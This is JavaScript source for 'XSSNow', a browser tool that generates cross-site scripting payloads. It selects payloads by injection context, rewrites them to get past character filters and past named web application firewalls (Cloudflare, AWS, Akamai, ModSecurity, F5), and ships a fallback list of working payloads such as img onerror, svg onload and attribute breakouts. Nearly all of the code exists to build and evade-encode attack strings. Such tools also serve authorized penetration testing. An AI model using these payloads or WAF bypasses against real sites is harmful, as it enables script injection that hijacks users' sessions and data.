/* XSSNow - Professional XSS Payload Generator */

class XSSPayloadGenerator {
  constructor() {
    this.payloadDatabase = [];
    this.history = JSON.parse(localStorage.getItem('xssnow-history') || '[]');
    this.currentPayload = null;
    this.init();
  }

  init() {
    this.loadPayloadDatabase();
    this.setupEventListeners();
    this.renderHistory();
    this.setupRestrictionToggle();
  }

  async loadPayloadDatabase() {
    try {
      const response = await fetch('data/payloads.yaml');
      const yamlText = await response.text();
      const yamlData = jsyaml.load(yamlText) || {};
      this.payloadDatabase = yamlData.payloads || [];
    } catch (error) {
      console.error('Failed to load payload database:', error);
      this.payloadDatabase = this.getFallbackPayloads();
    }
  }

  setupEventListeners() {
    // Main generate button
    const generateBtn = document.getElementById('generatePayload');
    if (generateBtn) {
      generateBtn.addEventListener('click', () => this.generatePayload());
    }

    // Action buttons
    const copyBtn = document.getElementById('copyPayload');
    if (copyBtn) {
      copyBtn.addEventListener('click', () => this.copyPayload());
    }

    const saveBtn = document.getElementById('savePayload');
    if (saveBtn) {
      saveBtn.addEventListener('click', () => this.savePayload());
    }

    const refreshBtn = document.getElementById('refreshPayload');
    if (refreshBtn) {
      refreshBtn.addEventListener('click', () => this.generatePayload());
    }

    const exportBtn = document.getElementById('exportPayloads');
    if (exportBtn) {
      exportBtn.addEventListener('click', () => this.exportPayloads());
    }
  }

  setupRestrictionToggle() {
    const lengthLimitCheckbox = document.getElementById('lengthLimit');
    const lengthInputGroup = document.getElementById('lengthInputGroup');

    if (lengthLimitCheckbox && lengthInputGroup) {
      lengthLimitCheckbox.addEventListener('change', () => {
        if (lengthLimitCheckbox.checked) {
          lengthInputGroup.style.display = 'block';
        } else {
          lengthInputGroup.style.display = 'none';
        }
      });
    }
  }

  generatePayload() {
    const context = document.getElementById('context')?.value || 'html';
    const waf = document.getElementById('waf')?.value || 'none';

    // Get character restrictions
    const restrictions = {
      noAngles: document.getElementById('noAngles')?.checked || false,
      noQuotes: document.getElementById('noQuotes')?.checked || false,
      noParens: document.getElementById('noParens')?.checked || false,
      noSlash: document.getElementById('noSlash')?.checked || false,
      noSemicolon: document.getElementById('noSemicolon')?.checked || false,
      lengthLimit: document.getElementById('lengthLimit')?.checked || false,
      maxLength: parseInt(document.getElementById('maxLength')?.value) || 100
    };


    // Filter payloads based on criteria and restrictions
    let filteredPayloads = this.payloadDatabase.filter(payload => {
      const contextMatch = this.matchesContext(payload, context);
      const restrictionMatch = this.passesRestrictions(payload.code, restrictions);

      return contextMatch && restrictionMatch;
    });


    if (filteredPayloads.length === 0) {
      filteredPayloads = this.getFallbackPayloads().filter(payload =>
        this.passesRestrictions(payload.code, restrictions)
      );
    }

    if (filteredPayloads.length === 0) {
      this.displayError('No payloads available with these restrictions. Try relaxing some constraints.');
      return;
    }

    // Select 5 random unique payloads
    const selectedPayloads = this.selectRandomPayloads(filteredPayloads, 5);
    const generatedPayloads = [];

    for (let payload of selectedPayloads) {
      // Apply transformations
      let generatedPayload = this.applyWAFBypass(payload.code, waf);

      // Apply restrictions after WAF bypass
      generatedPayload = this.applyRestrictionBypass(generatedPayload, restrictions);

      // Final restriction check
      if (this.passesRestrictions(generatedPayload, restrictions)) {
        generatedPayloads.push({
          code: generatedPayload,
          originalPayload: payload,
          metadata: {
            context,
            waf,
            restrictions,
            effectiveness: this.calculateEffectiveness(waf, restrictions),
            generatedAt: new Date().toISOString()
          }
        });
      }
    }

    if (generatedPayloads.length === 0) {
      this.displayError('No payloads passed restrictions. Try relaxing some constraints.');
      return;
    }

    // Display all generated payloads
    this.displayMultiplePayloads(generatedPayloads);
    this.currentPayloads = generatedPayloads;

    // Auto-add to history
    this.addToHistory(generatedPayloads);
  }

  passesRestrictions(payload, restrictions) {
    if (restrictions.noAngles && (payload.includes('<') || payload.includes('>'))) {
      return false;
    }
    if (restrictions.noQuotes && (payload.includes('"') || payload.includes("'"))) {
      return false;
    }
    if (restrictions.noParens && (payload.includes('(') || payload.includes(')'))) {
      return false;
    }
    if (restrictions.noSlash && payload.includes('/')) {
      return false;
    }
    if (restrictions.noSemicolon && payload.includes(';')) {
      return false;
    }
    if (restrictions.lengthLimit && payload.length > restrictions.maxLength) {
      return false;
    }
    return true;
  }

  applyRestrictionBypass(payload, restrictions) {
    let modifiedPayload = payload;

    // Apply restriction bypasses
    if (restrictions.noAngles) {
      // Use alternative methods without < >
      modifiedPayload = modifiedPayload
        .replace(/<script>/gi, 'javascript:')
        .replace(/<\/script>/gi, '')
        .replace(/<img[^>]*onerror[^>]*>/gi, 'javascript:alert()')
        .replace(/<[^>]*on\w+[^>]*>/gi, 'javascript:alert()');
    }

    if (restrictions.noQuotes) {
      // Replace quotes with alternatives
      modifiedPayload = modifiedPayload
        .replace(/"/g, '')
        .replace(/'/g, '')
        .replace(/alert\(\s*["']?[^"']*["']?\s*\)/gi, 'alert(document.domain)')
        .replace(/javascript:\s*["'][^"']*["']/gi, 'javascript:alert(1)');
    }

    if (restrictions.noParens) {
      // Use alternatives without parentheses
      modifiedPayload = modifiedPayload
        .replace(/alert\([^)]*\)/gi, 'alert`1`')
        .replace(/confirm\([^)]*\)/gi, 'confirm`1`')
        .replace(/prompt\([^)]*\)/gi, 'prompt`1`')
        .replace(/eval\([^)]*\)/gi, 'eval`alert\`1\``');
    }

    if (restrictions.noSlash) {
      // Remove forward slashes
      modifiedPayload = modifiedPayload
        .replace(/\/\*/g, '')
        .replace(/\*\//g, '')
        .replace(/\/\//g, '')
        .replace(/<\/script>/gi, '');
    }

    if (restrictions.noSemicolon) {
      // Remove semicolons
      modifiedPayload = modifiedPayload.replace(/;/g, '');
    }

    return modifiedPayload;
  }

  matchesContext(payload, context) {
    const payloadTags = payload.tags || [];
    const contextMap = {
      'html': ['html', 'tag', 'element'],
      'javascript': ['script', 'js', 'javascript'],
      'css': ['css', 'style'],
      'url': ['url', 'parameter', 'query'],
      'attribute': ['attribute', 'attr'],
      'dom': ['dom', 'javascript'],
      'json': ['json', 'api'],
      'xml': ['xml', 'soap']
    };

    const relevantTags = contextMap[context] || [];
    return relevantTags.some(tag =>
      payloadTags.some(payloadTag =>
        payloadTag.toLowerCase().includes(tag)
      )
    ) || payload.code.toLowerCase().includes(context);
  }

  matchesDifficulty(payload, difficulty) {
    const difficultyMap = {
      'basic': ['basic', 'simple', 'alert'],
      'moderate': ['bypass', 'filter', 'encode'],
      'advanced': ['advanced', 'csp', 'complex'],
      'expert': ['polyglot', 'expert', 'obfuscated']
    };

    const payloadTags = payload.tags || [];
    const payloadCategory = payload.category || 'basic';

    return difficultyMap[difficulty].some(tag =>
      payloadTags.some(payloadTag =>
        payloadTag.toLowerCase().includes(tag)
      ) || payloadCategory.toLowerCase().includes(tag)
    );
  }

  matchesBrowser(payload, browser) {
    if (browser === 'all') return true;

    const browsers = payload.browsers || ['Chrome', 'Firefox', 'Safari', 'Edge'];
    return browsers.some(b => b.toLowerCase().includes(browser.toLowerCase()));
  }

  applyWAFBypass(payload, waf) {
    const bypasses = {
      'cloudflare': {
        'script': 'ſcript',
        'alert': '\u0061lert',
        'onerror': 'on\u0065rror',
        'javascript': 'java\u0073cript'
      },
      'aws': {
        '<script>': '<ſcript>',
        'javascript:': 'data:text/html,<script>',
        'eval': 'setTimeout'
      },
      'akamai': {
        'script': 'SCRIPT',
        'src=': 'src =',
        'onerror': 'oN\u0065rror'
      },
      'modsecurity': {
        'union': 'uni/**/on',
        'script': 'scr<>ipt',
        'alert': 'confirm'
      },
      'f5': {
        '<': '%3C',
        '>': '%3E',
        'script': 'ſcript',
        'javascript': 'data:text/html,'
      }
    };

    if (waf === 'none' || !bypasses[waf]) return payload;

    let modifiedPayload = payload;
    const wafBypasses = bypasses[waf];

    for (const [original, replacement] of Object.entries(wafBypasses)) {
      modifiedPayload = modifiedPayload.replace(new RegExp(original, 'gi'), replacement);
    }

    return modifiedPayload;
  }

  applyEncoding(payload, encoding) {
    switch (encoding) {
      case 'url':
        return encodeURIComponent(payload);
      case 'html':
        return payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
      case 'unicode':
        return payload.split('').map(char =>
          char.charCodeAt(0) > 127 ? `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}` : char
        ).join('');
      case 'base64':
        return btoa(payload);
      case 'hex':
        return payload.split('').map(char =>
          '\\x' + char.charCodeAt(0).toString(16).padStart(2, '0')
        ).join('');
      default:
        return payload;
    }
  }

  selectRandomPayloads(payloads, count) {
    if (payloads.length <= count) {
      return payloads;
    }

    const shuffled = [...payloads].sort(() => 0.5 - Math.random());
    return shuffled.slice(0, count);
  }

  calculateEffectiveness(waf, restrictions) {
    const baseEffectiveness = 90;

    const wafPenalty = {
      'none': 0,
      'cloudflare': -10,
      'aws': -8,
      'akamai': -12,
      'modsecurity': -15,
      'f5': -10
    };

    // Penalty for restrictions
    let restrictionPenalty = 0;
    if (restrictions.noAngles) restrictionPenalty -= 15;
    if (restrictions.noQuotes) restrictionPenalty -= 10;
    if (restrictions.noParens) restrictionPenalty -= 8;
    if (restrictions.noSlash) restrictionPenalty -= 5;
    if (restrictions.noSemicolon) restrictionPenalty -= 3;
    if (restrictions.lengthLimit) restrictionPenalty -= 10;

    return Math.max(30, baseEffectiveness + wafPenalty[waf] + restrictionPenalty);
  }

  displayMultiplePayloads(payloads) {
    const outputElement = document.getElementById('payloadOutput');
    if (!outputElement) return;

    const payloadCards = payloads.map((payload, index) => {
      const effectiveness = payload.metadata.effectiveness;
      const effectivenessClass = effectiveness > 70 ? 'high' : effectiveness > 50 ? 'medium' : 'low';

      const bypassTypes = {
        'none': 'Standard',
        'cloudflare': 'Cloudflare Bypass',
        'aws': 'AWS WAF Bypass',
        'akamai': 'Akamai Bypass',
        'modsecurity': 'ModSecurity Bypass',
        'f5': 'F5 ASM Bypass'
      };

      return `
        <div class="payload-card">
          <div class="payload-header">
            <h4 class="payload-title">${this.escapeHtml(payload.originalPayload.category || 'XSS')} Payload #${index + 1}</h4>
            <div class="payload-actions">
              <button data-action="copy" data-payload-index="${index}" title="Copy">
                <i class="fas fa-copy"></i>
              </button>
              <button data-action="save" data-payload-index="${index}" title="Save">
                <i class="fas fa-save"></i>
              </button>
            </div>
          </div>
          <div class="payload-code">
            <code>${this.escapeHtml(payload.code)}</code>
          </div>
          <div class="payload-meta">
            <div class="meta-item">
              <span class="meta-label">Effectiveness</span>
              <span class="meta-value ${effectivenessClass}">${effectiveness}%</span>
            </div>
            <div class="meta-item">
              <span class="meta-label">Context</span>
              <span class="meta-value">${this.escapeHtml(payload.metadata.context)}</span>
            </div>
            <div class="meta-item">
              <span class="meta-label">Bypass Type</span>
              <span class="meta-value">${this.escapeHtml(bypassTypes[payload.metadata.waf] || 'Custom')}</span>
            </div>
            <div class="meta-item">
              <span class="meta-label">Length</span>
              <span class="meta-value ${payload.metadata.restrictions.lengthLimit && payload.code.length <= payload.metadata.restrictions.maxLength ? 'high' : ''}">${payload.code.length} chars</span>
            </div>
            <div class="meta-item">
              <span class="meta-label">Description</span>
              <span class="meta-value">${this.escapeHtml(payload.originalPayload.description || 'XSS payload')}</span>
            </div>
          </div>
        </div>
      `;
    }).join('');

    outputElement.innerHTML = payloadCards;
    this.setupPayloadCardEventListeners();
  }

  setupPayloadCardEventListeners() {
    const payloadButtons = document.querySelectorAll('[data-action]');
    payloadButtons.forEach(button => {
      button.addEventListener('click', (e) => {
        const action = e.currentTarget.dataset.action;
        const index = parseInt(e.currentTarget.dataset.payloadIndex);

        if (action === 'copy' && this.currentPayloads && this.currentPayloads[index]) {
          this.copyPayloadItem(this.currentPayloads[index].code);
        } else if (action === 'save' && this.currentPayloads && this.currentPayloads[index]) {
          this.savePayloadItem(index);
        }
      });
    });
  }

  displayError(message) {
    const outputElement = document.getElementById('payloadOutput');
    if (outputElement) {
      outputElement.innerHTML = `<div style="color: #ff4444; text-align: center; padding: 2rem;">
        <i class="fas fa-exclamation-triangle"></i><br>
        ${this.escapeHtml(message)}
      </div>`;
    }
  }

  copyPayloadItem(payload) {
    navigator.clipboard.writeText(payload).then(() => {
    }).catch(err => {
      console.error('Failed to copy payload:', err);
    });
  }

  savePayloadItem(index) {
    if (!this.currentPayloads || !this.currentPayloads[index]) return;

    const payload = this.currentPayloads[index];
    this.history.unshift({
      code: payload.code,
      metadata: payload.metadata,
      id: Date.now(),
      savedAt: new Date().toISOString()
    });

    // Keep only last 50 entries
    this.history = this.history.slice(0, 50);

    localStorage.setItem('xssnow-history', JSON.stringify(this.history));
    this.renderHistory();

    console.log('Payload saved to history');
  }

  escapeForJs(str) {
    return str.replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n');
  }

  addToHistory(payloads) {
    const timestamp = new Date().toISOString();
    payloads.forEach(payload => {
      this.history.unshift({
        code: payload.code,
        metadata: payload.metadata,
        id: Date.now() + Math.random(),
        savedAt: timestamp
      });
    });

    // Keep only last 50 entries
    this.history = this.history.slice(0, 50);
    localStorage.setItem('xssnow-history', JSON.stringify(this.history));
    this.renderHistory();
  }

  exportPayloads() {
    if (!this.currentPayloads || this.currentPayloads.length === 0) {
      alert('No payloads to export. Generate some payloads first.');
      return;
    }

    const payloadLines = this.currentPayloads
      .map(payload => payload.code.trim())
      .filter(code => code.length > 0)
      .join('\n');

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `xssnow-payloads-${timestamp}.txt`;

    const blob = new Blob([payloadLines], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);

    console.log(`Exported ${this.currentPayloads.length} payloads to ${filename}`);
  }

  renderHistory() {
    const historyElement = document.getElementById('payloadHistory');
    if (!historyElement) return;

    if (this.history.length === 0) {
      historyElement.innerHTML = `
        <div class="empty-history">
          <i class="fas fa-history"></i>
          <p>Your generated payloads will appear here</p>
        </div>
      `;
      return;
    }

    historyElement.innerHTML = this.history.slice(0, 10).map((item, index) => `
      <div class="history-item">
        <div class="history-payload">
          <code>${this.escapeHtml(item.code)}</code>
        </div>
        <div class="history-meta">
          <span class="history-context">${this.escapeHtml(item.metadata.context)}</span>
          <span class="history-waf">${this.escapeHtml(item.metadata.waf)}</span>
          <span class="history-date">${new Date(item.savedAt).toLocaleDateString()}</span>
        </div>
        <div class="history-actions">
          <button data-action="copy-history" data-history-index="${index}" title="Copy">
            <i class="fas fa-copy"></i>
          </button>
        </div>
      </div>
    `).join('');

    this.setupHistoryEventListeners();
  }

  setupHistoryEventListeners() {
    const historyButtons = document.querySelectorAll('[data-action="copy-history"]');
    historyButtons.forEach(button => {
      button.addEventListener('click', (e) => {
        const index = parseInt(e.currentTarget.dataset.historyIndex);
        if (this.history && this.history[index]) {
          this.copyHistoryItem(this.history[index].code);
        }
      });
    });
  }

  copyHistoryItem(payload) {
    navigator.clipboard.writeText(payload).then(() => {
      console.log('Payload copied from history');
    });
  }

  escapeHtml(text) {
    return text
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  }

  getFallbackPayloads() {
    return [
      {
        code: '<script>alert("XSS")</script>',
        category: 'basic',
        tags: ['basic', 'script', 'alert'],
        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
      },
      {
        code: '<img src=x onerror=alert("XSS")>',
        category: 'basic',
        tags: ['basic', 'img', 'onerror'],
        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
      },
      {
        code: '<svg onload=alert("XSS")>',
        category: 'moderate',
        tags: ['svg', 'onload', 'bypass'],
        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
      },
      {
        code: 'javascript:alert("XSS")',
        category: 'basic',
        tags: ['javascript', 'url'],
        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
      },
      {
        code: '<iframe src=javascript:alert("XSS")>',
        category: 'moderate',
        tags: ['iframe', 'javascript'],
        browsers: ['Chrome', 'Firefox', 'Edge']
      },
      {
        code: '<body onload=alert("XSS")>',
        category: 'basic',
        tags: ['body', 'onload'],
        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
      },
      {
        code: '<input onfocus=alert("XSS") autofocus>',
        category: 'moderate',
        tags: ['input', 'onfocus', 'autofocus'],
        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
      },
      {
        code: '"><script>alert("XSS")</script>',
        category: 'basic',
        tags: ['attribute', 'escape'],
        browsers: ['Chrome', 'Firefox', 'Safari', 'Edge']
      }
    ];
  }
}

// Initialize generator when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
  window.generator = new XSSPayloadGenerator();
});